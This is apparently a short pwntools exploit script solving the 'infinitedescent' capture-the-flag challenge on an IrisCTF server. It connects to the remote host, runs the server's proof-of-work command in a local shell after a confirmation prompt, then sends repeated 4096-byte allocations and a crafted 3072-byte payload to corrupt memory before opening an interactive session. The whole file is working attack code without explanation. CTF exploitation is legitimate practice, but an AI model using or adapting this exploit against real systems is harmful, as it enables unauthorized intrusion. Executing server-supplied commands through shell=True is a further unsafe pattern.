from pwn import *

from subprocess import check_output

r = remote('infinitedescent.chal.irisc.tf', 10002)

def solve_pow(io):
    io.recvuntil(b"with:\n    ")
    cmd = io.recvlineS().strip()
    print(cmd)
    if input("Ok? ").lower().strip() != "y":
        exit()
    out = check_output(cmd, shell=True).strip()
    print(out)
    io.sendlineafter(b"Solution? ", out)

#r = process("docker run --name temp_docker -v /home/paul/Downloads/Iris/Pwn/infinite:/home/user --rm -i -p 1234:1234 temp_docker".split())
solve_pow(r)
for _ in range(15):
    print('Loop')
    r.recvuntil(b"newline.\n")
    r.sendline(b"4096")
    r.recvuntil(b"newline.")
    r.sendline(b"a" * 4096)

r.recvuntil(b".\n")
r.sendline(b"3072")
r.sendline(b"@'\x00\x00" + b"a"*3068)
r.sendline(b"0000\n")
r.interactive()
